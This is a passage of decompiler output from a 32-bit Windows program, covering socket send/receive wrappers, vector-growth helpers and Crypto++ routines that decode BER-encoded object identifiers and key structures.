  int v3[2]; // [esp+4h] [ebp-14h] BYREF
  _BYTE *v4; // [esp+Ch] [ebp-Ch]
  int v5; // [esp+10h] [ebp-8h]
  int v6; // [esp+14h] [ebp-4h]

  sub_428630(this);
  v3[0] = 0;
  v3[1] = 0;
  v4 = 0;
  v5 = 0;
  v6 = 0;
  sub_432270(this + 4, v3);
  v2 = v4;
  if ( v4 )
  {
    if ( (unsigned int)(v6 - (_DWORD)v4) >= 0x1000 )
    {
      v2 = (_BYTE *)*((_DWORD *)v4 - 1);
      if ( (unsigned int)(v4 - v2 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v2);
  }
}

//----- (00432690) --------------------------------------------------------
int __thiscall sub_432690(_DWORD *this, char *buf, int len, int *a4)
{
  int *v4; // eax
  int *v5; // eax
  int v7; // eax
  int v8; // eax

  *a4 = 0;
  if ( buf )
  {
    v7 = sub_428750(this);
    v8 = recv(v7, buf, len, 0);
    if ( v8 <= 0 )
    {
      if ( v8 )
        return sub_432190();
      else
        return 3;
    }
    else
    {
      *a4 = v8;
      return 0;
    }
  }
  else
  {
    v4 = sub_468B30();
    v5 = (int *)sub_422D50(v4, "Cannot receive data from the network (the destination buffer is invalid)");
    sub_422FA0(v5);
    return 4;
  }
}

//----- (00432700) --------------------------------------------------------
int __thiscall sub_432700(_BYTE *this, int a2, unsigned int a3)
{
  int *v4; // eax
  int *v5; // eax
  unsigned int v7; // [esp+4h] [ebp-4h] BYREF

  if ( !sub_428760(this) )
  {
    v4 = sub_468B30();
    v5 = (int *)sub_422D50(v4, "Warning: Partial sends might not be handled properly.");
    sub_422FA0(v5);
  }
  return sub_432750(this, a2, a3, &v7);
}

//----- (00432750) --------------------------------------------------------
int __thiscall sub_432750(_DWORD *this, int a2, unsigned int a3, unsigned int *a4)
{
  _DWORD *v4; // edx
  unsigned int v5; // ecx
  int v6; // eax
  int v7; // eax
  int result; // eax
  int *v9; // eax
  int *v10; // eax
  const char *v11; // [esp-10h] [ebp-1Ch]
  int v12; // [esp-Ch] [ebp-18h]

  v4 = this;
  if ( a2 && a3 )
  {
    v5 = 0;
    *a4 = 0;
    while ( 1 )
    {
      v12 = a3 - v5;
      v11 = (const char *)(v5 + a2);
      v6 = sub_428750(v4);
      v7 = send(v6, v11, v12, 0);
      if ( v7 < 0 )
        break;
      v4 = this;
      v5 = v7 + *a4;
      *a4 = v5;
      if ( v5 >= a3 )
        return 0;
    }
    result = sub_432190();
    if ( result == 1 )
    {
      if ( *a4 )
        return 2;
    }
  }
  else
  {
    v9 = sub_468B30();
    v10 = (int *)sub_422D50(v9, "Cannot send data over the network (no data to send)");
    sub_422FA0(v10);
    return 4;
  }
  return result;
}

//----- (004327F0) --------------------------------------------------------
unsigned int __cdecl sub_4327F0(_DWORD *a1)
{
  unsigned int result; // eax
  unsigned int v2; // esi
  unsigned int v3; // ecx

  if ( !*a1 )
    return 0;
  v2 = 0;
  result = 32;
  do
  {
    v3 = (result + v2) >> 1;
    if ( !(*a1 >> v3) )
    {
      result = (result + v2) >> 1;
      v3 = v2;
    }
    v2 = v3;
  }
  while ( result - v3 > 1 );
  return result;
}

//----- (00432830) --------------------------------------------------------
int __cdecl sub_432830(unsigned int *a1)
{
  unsigned int v1; // ecx
  unsigned int v2; // ebp
  bool v3; // zf
  int result; // eax
  unsigned int v5; // ebx
  unsigned int v6; // esi
  unsigned int v7; // [esp+8h] [ebp+4h]

  v1 = a1[1];
  v2 = *a1;
  result = v1 | *a1;
  v3 = *(_QWORD *)a1 == 0i64;
  v7 = v1;
  if ( !v3 )
  {
    v5 = 0;
    v6 = 64;
    do
    {
      if ( __PAIR64__(v1, v2) >> ((v6 + v5) >> 1) )
        v5 = (v6 + v5) >> 1;
      else
        v6 = (v6 + v5) >> 1;
      v1 = v7;
    }
    while ( v6 - v5 > 8 );
    return v6 >> 3;
  }
  return result;
}

//----- (00432890) --------------------------------------------------------
int __thiscall sub_432890(const void **this, _BYTE *Src, _DWORD *a3)
{
  int v4; // ebx
  int v5; // eax
  unsigned int v6; // ecx
  unsigned int v7; // ebp
  unsigned int v8; // edx
  unsigned int v9; // edi
  _DWORD *v10; // eax
  _BYTE *v11; // ecx
  const void *v12; // edx
  void *v14; // [esp+8h] [ebp-Ch]
  _DWORD *v15; // [esp+Ch] [ebp-8h]
  int v16; // [esp+10h] [ebp-4h]

  v4 = (Src - (_BYTE *)*this) >> 2;
  v5 = ((_BYTE *)this[1] - (_BYTE *)*this) >> 2;
  if ( v5 == 0x3FFFFFFF )
    sub_420130();
  v6 = ((_BYTE *)this[2] - (_BYTE *)*this) >> 2;
  v7 = v5 + 1;
  v8 = v6 >> 1;
  if ( v6 <= 0x3FFFFFFF - (v6 >> 1) )
  {
    v9 = v8 + v6;
    if ( v8 + v6 < v7 )
      v9 = v5 + 1;
  }
  else
  {
    v9 = v5 + 1;
  }
  v10 = sub_4343B0(v9);
  v14 = v10;
  v16 = v4;
  v15 = &v10[v16];
  v10[v16] = *a3;
  v11 = this[1];
  v12 = *this;
  if ( Src == v11 )
  {
    memmove_0(v10, v12, v11 - (_BYTE *)v12);
  }
  else
  {
    memmove_0(v10, v12, Src - (_BYTE *)v12);
    memmove_0(v15 + 1, Src, (_BYTE *)this[1] - Src);
  }
  sub_434350(this, (int)v14, v7, v9);
  return (int)*this + v16 * 4;
}
// 420130: using guessed type void __noreturn sub_420130(void);

//----- (00432970) --------------------------------------------------------
int __thiscall sub_432970(int this, unsigned int a2, int a3)
{
  unsigned int v5; // ecx
  unsigned int v6; // edx
  unsigned int v7; // ebp
  _DWORD *v8; // esi
  int v10; // [esp+Ch] [ebp+4h]

  if ( a2 > 0x3FFFFFFF )
    sub_420130();
  v10 = (*(_DWORD *)(this + 4) - *(_DWORD *)this) >> 2;
  v5 = (*(_DWORD *)(this + 8) - *(_DWORD *)this) >> 2;
  v6 = (unsigned int)((*(_DWORD *)(this + 8) - *(_DWORD *)this) >> 2) >> 1;
  if ( v5 <= 0x3FFFFFFF - v6 )
  {
    v7 = v6 + v5;
    if ( v6 + v5 < a2 )
      v7 = a2;
  }
  else
  {
    v7 = a2;
  }
  v8 = sub_4343B0(v7);
  memset(&v8[v10], 0, 4 * (a2 - v10));
  memmove_0(v8, *(const void **)this, *(_DWORD *)(this + 4) - *(_DWORD *)this);
  return sub_434350((_DWORD *)this, (int)v8, a2, v7);
}
// 420130: using guessed type void __noreturn sub_420130(void);

//----- (00432A00) --------------------------------------------------------
char *__thiscall sub_432A00(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::BERDecodeErr::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B8934: using guessed type void *CryptoPP::BERDecodeErr::`vftable';

//----- (00432A90) --------------------------------------------------------
char *__thiscall sub_432A90(char *this)
{
  unsigned int v2; // edx
  void *v3; // ecx
  void *v5[5]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v6; // [esp+24h] [ebp-14h]
  int v7; // [esp+34h] [ebp-4h]

  v5[4] = 0;
  v6 = 15;
  LOBYTE(v5[0]) = 0;
  sub_41EF80(v5, "BER decode error", 0x10u);
  v7 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v7) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 1;
  sub_419BE0((_DWORD *)this + 4, v5);
  v2 = v6;
  *(_DWORD *)this = &CryptoPP::InvalidArgument::`vftable';
  if ( v2 >= 0x10 )
  {
    v3 = v5[0];
    if ( v2 + 1 >= 0x1000 )
    {
      v3 = (void *)*((_DWORD *)v5[0] - 1);
      if ( (unsigned int)(v5[0] - v3 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v3);
  }
  *(_DWORD *)this = &CryptoPP::BERDecodeErr::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4B891C: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 4B8934: using guessed type void *CryptoPP::BERDecodeErr::`vftable';

//----- (00432B70) --------------------------------------------------------
int *__thiscall sub_432B70(int *this, int a2, char a3)
{
  int v4; // ecx
  int v5; // ecx
  char v6; // bl

  sub_435E90(this, 0);
  v4 = a2;
  this[3] = -1;
  *((_BYTE *)this + 16) = 0;
  *this = (int)&CryptoPP::BERGeneralDecoder::`vftable';
  this[1] = (int)&CryptoPP::BERGeneralDecoder::`vftable';
  this[5] = v4;
  *((_BYTE *)this + 32) = 0;
  if ( !(*(int (__thiscall **)(int, int *))(*(_DWORD *)v4 + 76))(v4, &a2)
    || (v6 = a3, (_BYTE)a2 != a3)
    || !sub_433890(this[5], this + 6, (_BYTE *)this + 33)
    || !*((_BYTE *)this + 33) && (v6 & 0x20) == 0 )
  {
    sub_433790(v5);
  }
  return this;
}
// 432BE0: variable 'v5' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);
// 4B8A30: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';
// 4B8AEC: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';

//----- (00432BF0) --------------------------------------------------------
_DWORD *__thiscall sub_432BF0(_DWORD *this, int a2, char a3)
{
  _DWORD *result; // eax

  sub_45F0D0((int)this, 0);
  this[10] = a2;
  *((_BYTE *)this + 44) = a3;
  result = this;
  *this = &CryptoPP::DERGeneralEncoder::`vftable';
  this[1] = &CryptoPP::DERGeneralEncoder::`vftable';
  *((_BYTE *)this + 45) = 0;
  return result;
}
// 4B8AFC: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 4B8BB4: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';

//----- (00432C40) --------------------------------------------------------
void __thiscall sub_432C40(void *this)
{
  bool v1; // zf
  int v2; // ecx
  int v3; // [esp+0h] [ebp-24h] BYREF
  unsigned __int16 v4; // [esp+10h] [ebp-14h] BYREF
  int *v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  v5 = &v3;
  v1 = *((_BYTE *)this + 32) == 0;
  *(_DWORD *)this = &CryptoPP::BERGeneralDecoder::`vftable';
  *((_DWORD *)this + 1) = &CryptoPP::BERGeneralDecoder::`vftable';
  v6 = 0;
  if ( v1 )
  {
    v1 = *((_BYTE *)this + 33) == 0;
    *((_BYTE *)this + 32) = 1;
    if ( v1 )
    {
      if ( sub_437500(*((void **)this + 5), &v4, 1) != 2 || v4 )
        sub_433790(v2);
    }
    else if ( *((_QWORD *)this + 3) )
    {
      sub_433790(this);
    }
  }
}
// 432CD2: variable 'v2' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);
// 4B8A30: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';
// 4B8AEC: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';

//----- (00432CF0) --------------------------------------------------------
void __thiscall sub_432CF0(int this)
{
  bool v2; // zf
  _DWORD v3[9]; // [esp+0h] [ebp-24h] BYREF

  v3[5] = v3;
  v3[4] = this;
  *(_DWORD *)this = &CryptoPP::DERGeneralEncoder::`vftable';
  *(_DWORD *)(this + 4) = &CryptoPP::DERGeneralEncoder::`vftable';
  v2 = *(_BYTE *)(this + 45) == 0;
  v3[8] = 1;
  if ( v2 )
    sub_434250(this);
  boost::exception::~exception((boost::exception *)this);
}
// 45F280: using guessed type void __thiscall boost::exception::~exception(boost::exception *__hidden this);
// 4B8AFC: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 4B8BB4: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';

//----- (00432D75) --------------------------------------------------------
void *__thiscall sub_432D75(char *this, char a2)
{
  return sub_432DB0(this - 4, a2);
}

//----- (00432D7D) --------------------------------------------------------
void *__thiscall sub_432D7D(char *this, char a2)
{
  return sub_432DD0(this - 4, a2);
}

//----- (00432D85) --------------------------------------------------------
void *__thiscall sub_432D85(char *this, char a2)
{
  return sub_432DF0(this - 4, a2);
}

//----- (00432D90) --------------------------------------------------------
_DWORD *__thiscall sub_432D90(_DWORD *this, char a2)
{
  sub_4050D0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00432DB0) --------------------------------------------------------
void *__thiscall sub_432DB0(void *this, char a2)
{
  sub_432C40(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00432DD0) --------------------------------------------------------
void *__thiscall sub_432DD0(void *this, char a2)
{
  sub_432CF0((int)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00432DF0) --------------------------------------------------------
void *__thiscall sub_432DF0(void *this, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (00432E10) --------------------------------------------------------
bool __thiscall sub_432E10(_DWORD *this)
{
  return !sub_45FB40(this);
}

//----- (00432E20) --------------------------------------------------------
int __thiscall sub_432E20(int *this, int a2)
{
  int v2; // ebx
  int v4; // ecx
  void *v5; // edi
  void *v6; // eax
  unsigned int v7; // edi
  int v8; // edx
  unsigned int v9; // ecx
  char *v10; // eax
  size_t v11; // esi
  int result; // eax
  unsigned int v13; // esi
  unsigned int v14; // edi
  int v15; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v16; // [esp+14h] [ebp-8h]
  void *v17; // [esp+18h] [ebp-4h] BYREF

  v2 = a2;
  if ( !(*(int (__thiscall **)(int, int *))(*(_DWORD *)a2 + 76))(a2, &a2) )
    goto LABEL_24;
  if ( (_BYTE)a2 != 6 )
    goto LABEL_24;
  if ( !sub_433820(v2, &v17) )
    goto LABEL_24;
  v5 = v17;
  if ( !v17 || !(*(int (__thiscall **)(int, int *))(*(_DWORD *)v2 + 76))(v2, &a2) )
    goto LABEL_24;
  v6 = (void *)this[2];
  v7 = (unsigned int)v5 - 1;
  v8 = this[1];
  v16 = v7;
  v9 = ((int)v6 - v8) >> 2;
  HIBYTE(v15) = 0;
  v17 = v6;
  if ( v9 <= 2 )
  {
    if ( v9 >= 2 )
      goto LABEL_13;
    if ( (unsigned int)((this[3] - v8) >> 2) < 2 )
    {
      sub_432970((int)(this + 1), 2u, (int)&v15 + 3);
      goto LABEL_13;
    }
    v11 = 4 * (2 - v9);
    memset(v17, 0, v11);
    v10 = (char *)v17 + v11;
  }
  else
  {
    v10 = (char *)(v8 + 8);
  }
  this[2] = (int)v10;
LABEL_13:
  *(_DWORD *)this[1] = (unsigned __int8)a2 / 0x28u;
  result = this[1];
  *(_DWORD *)(result + 4) = (unsigned __int8)a2 % 0x28u;
  if ( v7 )
  {
    while ( 1 )
    {
      v13 = 0;
      v14 = 0;
      do
      {
        if ( !(*(int (__thiscall **)(int, char *))(*(_DWORD *)v2 + 76))(v2, (char *)&v15 + 3) )
          goto LABEL_24;
        ++v13;
        if ( v14 >= 0x2000000 )
          goto LABEL_24;
        LOBYTE(v4) = HIBYTE(v15);
        v14 = (HIBYTE(v15) & 0x7F) + (v14 << 7);
        v17 = (void *)v14;
      }
      while ( v15 < 0 );
      if ( v13 > v16 )
        break;
      result = this[2];
      if ( this[3] == result )
      {
        result = sub_432890((const void **)this + 1, (_BYTE *)result, &v17);
      }
      else
      {
        *(_DWORD *)result = v14;
        this[2] += 4;
      }
      v16 -= v13;
      if ( !v16 )
        return result;
    }
LABEL_24:
    sub_433790(v4);
  }
  return result;
}
// 432F84: variable 'v4' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);

//----- (00432F90) --------------------------------------------------------
void __thiscall sub_432F90(int *this, int *a2)
{
  int v3; // ecx
  unsigned __int64 v4; // rax
  size_t v5; // esi
  _BYTE *v6; // edi
  size_t v7; // edx
  int v8; // eax
  int v9; // eax
  _DWORD *v10; // eax
  bool v11; // zf
  int v12; // eax
  _DWORD v13[3]; // [esp+10h] [ebp-28h] BYREF
  _BYTE *v14; // [esp+1Ch] [ebp-1Ch]
  size_t v15; // [esp+20h] [ebp-18h] BYREF
  unsigned __int16 v16; // [esp+24h] [ebp-14h] BYREF
  unsigned __int16 v17; // [esp+28h] [ebp-10h] BYREF
  int v18; // [esp+34h] [ebp-4h]
  int v19[4]; // [esp+38h] [ebp+0h] BYREF
  char v20; // [esp+48h] [ebp+10h]
  void ***v21; // [esp+4Ch] [ebp+14h]
  __int64 v22; // [esp+50h] [ebp+18h] BYREF
  char v23; // [esp+58h] [ebp+20h]
  char v24[7]; // [esp+59h] [ebp+21h] BYREF
  void **v25; // [esp+60h] [ebp+28h] BYREF
  void **v26; // [esp+64h] [ebp+2Ch]
  int v27; // [esp+6Ch] [ebp+34h]
  char v28; // [esp+70h] [ebp+38h]
  int *v29; // [esp+74h] [ebp+3Ch]
  __int64 v30; // [esp+78h] [ebp+40h] BYREF
  char v31; // [esp+80h] [ebp+48h]
  char v32[7]; // [esp+81h] [ebp+49h] BYREF
  void **v33; // [esp+88h] [ebp+50h] BYREF
  void **v34; // [esp+8Ch] [ebp+54h]
  int v35; // [esp+94h] [ebp+5Ch]
  char v36; // [esp+98h] [ebp+60h]
  int *v37; // [esp+9Ch] [ebp+64h]
  __int64 v38; // [esp+A0h] [ebp+68h] BYREF
  char v39; // [esp+A8h] [ebp+70h]
  char v40[7]; // [esp+A9h] [ebp+71h] BYREF

  sub_435E90(&v33, 0);
  v35 = -1;
  v36 = 0;
  v33 = &CryptoPP::BERGeneralDecoder::`vftable';
  v34 = &CryptoPP::BERGeneralDecoder::`vftable';
  v37 = a2;
  v39 = 0;
  if ( !(*(int (__thiscall **)(int *, char *))(*a2 + 76))(a2, (char *)&v16 + 1) )
    goto LABEL_54;
  if ( HIBYTE(v16) != 48 )
    goto LABEL_54;
  if ( !sub_433890((int)v37, (int *)&v38, v40) )
    goto LABEL_54;
  v33 = &CryptoPP::BERSequenceDecoder::`vftable';
  v34 = &CryptoPP::BERSequenceDecoder::`vftable';
  v18 = 0;
  if ( !sub_4371D0((int *)&v33, (int)&v17 + 1) )
    goto LABEL_54;
  if ( HIBYTE(v17) != 2 )
    goto LABEL_54;
  if ( !sub_433820((int)&v33, &v15) )
    goto LABEL_54;
  LODWORD(v4) = ((int (__thiscall *)(void ***))v33[16])(&v33);
  v5 = v15;
  v3 = 0;
  if ( v15 > v4 )
    goto LABEL_54;
  if ( !v15 )
    goto LABEL_54;
  sub_419060(v13, v15);
  v6 = v14;
  LOBYTE(v18) = 1;
  if ( v5 != ((int (__thiscall *)(void ***, _BYTE *, size_t))v33[18])(&v33, v14, v5) )
    goto LABEL_54;
  if ( v5 > 4 )
  {
    while ( !*v6 )
    {
      --v5;
      ++v6;
      if ( v5 <= 4 )
        goto LABEL_15;
    }
LABEL_54:
    sub_433790(v3);
  }
LABEL_15:
  v3 = 0;
  v7 = 0;
  if ( v5 )
  {
    do
    {
      v8 = (unsigned __int8)v6[v7++];
      v3 = v8 | (v3 << 8);
    }
    while ( v7 < v5 );
    if ( v3 )
      goto LABEL_54;
  }
  LOBYTE(v18) = 0;
  sub_419010(v13);
  sub_435E90(&v25, 0);
  v27 = -1;
  v29 = (int *)&v33;
  v28 = 0;
  v25 = &CryptoPP::BERGeneralDecoder::`vftable';
  v26 = &CryptoPP::BERGeneralDecoder::`vftable';
  v31 = 0;
  if ( !((int (__thiscall *)(void ***, char *))v33[19])(&v33, (char *)&v17 + 1)
    || HIBYTE(v17) != 48
    || !sub_433890((int)v29, (int *)&v30, v32) )
  {
    goto LABEL_54;
  }
  v25 = &CryptoPP::BERSequenceDecoder::`vftable';
  v26 = &CryptoPP::BERSequenceDecoder::`vftable';
  v9 = *this;
  LOBYTE(v18) = 2;
  v10 = (_DWORD *)(*(int (__thiscall **)(int *, _DWORD *))(v9 + 16))(this, v13);
  LOBYTE(v18) = 3;
  sub_4336A0(v10, (int)&v25);
  LOBYTE(v18) = 2;
  sub_408A00(v13);
  if ( v32[0] )
  {
    v11 = v30 == 0;
  }
  else
  {
    if ( sub_437840(v29, &v16, 1) != 2 )
      goto LABEL_27;
    v11 = v16 == 0;
  }
  if ( v11 )
  {
    LOBYTE(v15) = 0;
    goto LABEL_28;
  }
LABEL_27:
  LOBYTE(v15) = (*(int (__thiscall **)(int *, void ***))(*this + 20))(this, &v25);
LABEL_28:
  v31 = 1;
  if ( v32[0] )
  {
    if ( v30 )
      goto LABEL_54;
  }
  else if ( sub_437500(v29, &v16, 1) != 2 || v16 )
  {
    goto LABEL_54;
  }
  sub_435E90(v19, 0);
  v19[3] = -1;
  v21 = &v33;
  v20 = 0;
  v19[0] = (int)&CryptoPP::BERGeneralDecoder::`vftable';
  v19[1] = (int)&CryptoPP::BERGeneralDecoder::`vftable';
  v23 = 0;
  if ( !((int (__thiscall *)(void ***, char *))v33[19])(&v33, (char *)&v16 + 1)
    || HIBYTE(v16) != 4
    || !sub_433890((int)v21, (int *)&v22, v24)
    || !v24[0] )
  {
    goto LABEL_54;
  }
  v12 = *this;
  LOBYTE(v18) = 4;
  (*(void (__thiscall **)(int *, int *, size_t, _DWORD))(v12 + 28))(this, v19, v15, v38);
  v23 = 1;
  if ( v24[0] )
  {
    if ( v22 )
LABEL_55:
      sub_433790(v3);
  }
  else if ( sub_437500(v21, &v17, 1) != 2 || v17 )
  {
    goto LABEL_54;
  }
  if ( v40[0] )
  {
    if ( !v38 )
      goto LABEL_48;
LABEL_47:
    (*(void (__thiscall **)(int *, void ***))(*this + 36))(this, &v33);
    goto LABEL_48;
  }
  if ( sub_437840(v37, &v17, 1) != 2 || v17 )
    goto LABEL_47;
LABEL_48:
  v39 = 1;
  if ( v40[0] )
  {
    if ( v38 )
      goto LABEL_55;
  }
  else if ( sub_437500(v37, &v17, 1) != 2 || v17 )
  {
    goto LABEL_54;
  }
  sub_432C40(v19);
  sub_432C40(&v25);
  sub_432C40(&v33);
}
// 4330D6: conditional instruction was optimized away because esi.4>=5u
// 43308F: variable 'v4' is possibly undefined
// 433376: variable 'v3' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);
// 4B8A30: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';
// 4B8AEC: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';
// 4B8BC4: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 4B8C80: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 432F90: using guessed type char var_B[7];
// 432F90: using guessed type _DWORD var_A4[3];
// 432F90: using guessed type char var_33[7];
// 432F90: using guessed type char var_5B[7];

//----- (00433390) --------------------------------------------------------
void __thiscall sub_433390(int *this, void *a2)
{
  int v3; // ecx
  int v4; // eax
  _DWORD *v5; // eax
  bool v6; // zf
  _DWORD v7[4]; // [esp+8h] [ebp-28h] BYREF
  int v8; // [esp+18h] [ebp-18h]
  unsigned __int16 v9; // [esp+1Ch] [ebp-14h] BYREF
  unsigned __int16 v10; // [esp+20h] [ebp-10h] BYREF
  int v11; // [esp+2Ch] [ebp-4h]
  int v12[4]; // [esp+30h] [ebp+0h] BYREF
  char v13; // [esp+40h] [ebp+10h]
  void ***v14; // [esp+44h] [ebp+14h]
  __int64 v15; // [esp+48h] [ebp+18h] BYREF
  char v16; // [esp+50h] [ebp+20h]
  char v17[7]; // [esp+51h] [ebp+21h] BYREF
  void **v18; // [esp+58h] [ebp+28h] BYREF
  void **v19; // [esp+5Ch] [ebp+2Ch]
  int v20; // [esp+64h] [ebp+34h]
  char v21; // [esp+68h] [ebp+38h]
  void *v22; // [esp+6Ch] [ebp+3Ch]
  __int64 v23; // [esp+70h] [ebp+40h] BYREF
  char v24; // [esp+78h] [ebp+48h]
  char v25[7]; // [esp+79h] [ebp+49h] BYREF
  void **v26; // [esp+80h] [ebp+50h] BYREF
  void **v27; // [esp+84h] [ebp+54h]
  int v28; // [esp+8Ch] [ebp+5Ch]
  char v29; // [esp+90h] [ebp+60h]
  int *v30; // [esp+94h] [ebp+64h]
  __int64 v31; // [esp+98h] [ebp+68h] BYREF
  char v32; // [esp+A0h] [ebp+70h]
  char v33[7]; // [esp+A1h] [ebp+71h] BYREF

  sub_435E90(&v18, 0);
  v20 = -1;
  v21 = 0;
  v18 = &CryptoPP::BERGeneralDecoder::`vftable';
  v19 = &CryptoPP::BERGeneralDecoder::`vftable';
  v22 = a2;
  v24 = 0;
  if ( !(*(int (__thiscall **)(void *, char *))(*(_DWORD *)a2 + 76))(a2, (char *)&v10 + 1) )
    goto LABEL_36;
  if ( HIBYTE(v10) != 48 )
    goto LABEL_36;
  if ( !sub_433890((int)v22, (int *)&v23, v25) )
    goto LABEL_36;
  v18 = &CryptoPP::BERSequenceDecoder::`vftable';
  v19 = &CryptoPP::BERSequenceDecoder::`vftable';
  v11 = 0;
  sub_435E90(&v26, 0);
  v28 = -1;
  v30 = (int *)&v18;
  v29 = 0;
  v26 = &CryptoPP::BERGeneralDecoder::`vftable';
  v27 = &CryptoPP::BERGeneralDecoder::`vftable';
  v32 = 0;
  if ( !((int (__thiscall *)(void ***, char *))v18[19])(&v18, (char *)&v9 + 1)
    || HIBYTE(v9) != 48
    || !sub_433890((int)v30, (int *)&v31, v33) )
  {
    goto LABEL_36;
  }
  v26 = &CryptoPP::BERSequenceDecoder::`vftable';
  v27 = &CryptoPP::BERSequenceDecoder::`vftable';
  v4 = *this;
  LOBYTE(v11) = 1;
  v5 = (_DWORD *)(*(int (__thiscall **)(int *, _DWORD *))(v4 + 16))(this, v7);
  LOBYTE(v11) = 2;
  sub_4336A0(v5, (int)&v26);
  LOBYTE(v11) = 1;
  sub_408A00(v7);
  if ( v33[0] )
  {
    v6 = v31 == 0;
  }
  else
  {
    if ( sub_437840(v30, &v10, 1) != 2 )
      goto LABEL_13;
    v6 = v10 == 0;
  }
  if ( v6 )
  {
    LOBYTE(v8) = 0;
    goto LABEL_14;
  }
LABEL_13:
  LOBYTE(v8) = (*(int (__thiscall **)(int *, void ***))(*this + 20))(this, &v26);
LABEL_14:
  v32 = 1;
  if ( v33[0] )
  {
    if ( v31 )
      goto LABEL_36;
  }
  else if ( sub_437500(v30, &v10, 1) != 2 || v10 )
  {
    goto LABEL_36;
  }
  sub_435E90(v12, 0);
  v12[3] = -1;
  v14 = &v18;
  v13 = 0;
  v12[0] = (int)&CryptoPP::BERGeneralDecoder::`vftable';
  v12[1] = (int)&CryptoPP::BERGeneralDecoder::`vftable';
  v16 = 0;
  if ( !((int (__thiscall *)(void ***, char *))v18[19])(&v18, (char *)&v10 + 1) )
    goto LABEL_36;
  if ( HIBYTE(v10) != 3 )
    goto LABEL_36;
  if ( !sub_433890((int)v14, (int *)&v15, v17) )
    goto LABEL_36;
  if ( !v17[0] )
    goto LABEL_36;
  LOBYTE(v11) = 3;
  if ( !(*(int (__thiscall **)(int *, char *))(v12[0] + 76))(v12, (char *)&v9 + 1) || HIBYTE(v9) )
    goto LABEL_36;
  (*(void (__thiscall **)(int *, int *, int, _DWORD))(*this + 28))(this, v12, v8, v15);
  v16 = 1;
  if ( v17[0] )
  {
    if ( v15 )
LABEL_37:
      sub_433790(v3);
  }
  else if ( sub_437500(v14, &v9, 1) != 2 || v9 )
  {
    goto LABEL_36;
  }
  v24 = 1;
  if ( !v25[0] )
  {
    if ( sub_437500(v22, &v9, 1) == 2 && !v9 )
      goto LABEL_35;
LABEL_36:
    sub_433790(v3);
  }
  if ( v23 )
    goto LABEL_37;
LABEL_35:
  sub_432C40(v12);
  sub_432C40(&v26);
  sub_432C40(&v18);
}
// 43368B: variable 'v3' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);
// 4B8A30: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';
// 4B8AEC: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';
// 4B8BC4: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 4B8C80: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 433390: using guessed type char var_33[7];
// 433390: using guessed type char var_B[7];
// 433390: using guessed type _DWORD var_A4[4];
// 433390: using guessed type char var_5B[7];

//----- (004336A0) --------------------------------------------------------
void __thiscall sub_4336A0(_DWORD *this, int a2)
{
  int v3; // eax
  int *v4; // esi
  int v5; // ecx
  int v6; // edi
  unsigned int v7; // eax
  bool v8; // cf
  unsigned int v9; // eax
  void **v10; // [esp+Ch] [ebp-1Ch] BYREF
  int v11; // [esp+10h] [ebp-18h]
  int v12; // [esp+14h] [ebp-14h]
  int v13; // [esp+18h] [ebp-10h]
  int v14; // [esp+24h] [ebp-4h]

  v10 = &CryptoPP::OID::`vftable';
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  sub_432E20((int *)&v10, a2);
  v3 = this[2];
  v4 = (int *)this[1];
  v5 = v3 - (_DWORD)v4;
  v6 = v11;
  v14 = 1;
  if ( (((v3 - (_DWORD)v4) ^ (v12 - v11)) & 0xFFFFFFFC) != 0 )
    goto LABEL_14;
  v7 = v3 - (_DWORD)v4;
  v8 = v7 < 4;
  v9 = v7 - 4;
  if ( v8 )
  {
LABEL_5:
    if ( v9 == -4 )
      goto LABEL_13;
  }
  else
  {
    while ( 1 )
    {
      v5 = *v4;
      if ( *v4 != *(_DWORD *)v6 )
        break;
      ++v4;
      v6 += 4;
